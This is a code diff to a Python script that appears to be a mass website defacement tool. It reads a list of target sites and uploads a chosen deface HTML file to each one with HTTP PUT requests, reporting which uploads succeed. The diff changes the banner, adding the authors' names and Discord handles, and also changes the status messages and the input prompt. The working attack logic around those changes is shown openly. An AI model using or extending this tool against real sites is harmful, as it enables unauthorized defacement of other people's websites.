@@ -8,16 +8,16 @@ except ImportError:
    exit("install requests and try again ...")
 
 banner = """
- ▒█████   ██▓███  
-▒██▒  ██▒▓██░  ██▒
-▒██░  ██▒▓██░ ██▓▒
-▒██   ██░▒██▄█▓▒ ▒
-░ ████▓▒░▒██▒ ░  ░
-░ ▒░▒░▒░ ▒▓▒░ ░  ░
-  ░ ▒ ▒░ ░▒ ░     
-░ ░ ░ ▒  ░░       
-    ░ ░           
-                  """
+ ▒█████   ███▄    █ 
+▒██▒  ██▒ ██ ▀█   █     MADE BY:
+▒██░  ██▒▓██  ▀█ ██▒    OPALE & NILS
+▒██   ██░▓██▒  ▐▌██▒
+░ ████▓▒░▒██░   ▓██░    DISCORD:
+░ ▒░▒░▒░ ░ ▒░   ▒ ▒     opaleeeeeee7
+  ░ ▒ ▒░ ░ ░░   ░ ▒░    lvtkr
+░ ░ ░ ▒     ░   ░ ░ 
+    ░ ░           ░ 
+                    """
 
 b = '\033[31m'
 h = '\033[32m'
@@ -45,9 +45,9 @@ def aox(script,target_file="target.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
+               print(m+"❌"+b+" FAILED"+m+" %s/%s"%(site,script))
             else:
-               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
+               print(m+"✅"+h+" UPLOADED"+m+" %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
@@ -58,7 +58,7 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         a = x("Enter your script deface name: ")
+         a = x("Enter your deface .html file: ")
          if not os.path.isfile(a):
             print("file '%s' not found"%(a))
             continue
